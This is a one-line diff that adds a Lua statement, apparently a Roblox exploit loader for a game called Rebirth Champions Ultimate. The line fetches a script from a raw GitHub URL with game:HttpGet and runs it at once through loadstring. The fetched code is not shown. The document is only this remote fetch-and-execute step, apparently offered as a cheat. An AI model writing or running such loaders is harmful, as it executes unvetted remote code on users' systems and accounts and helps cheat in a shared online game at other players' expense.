@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/rebirth-champions-ultimate-spam7-j1jl2ur9o82fj2.lua"))()
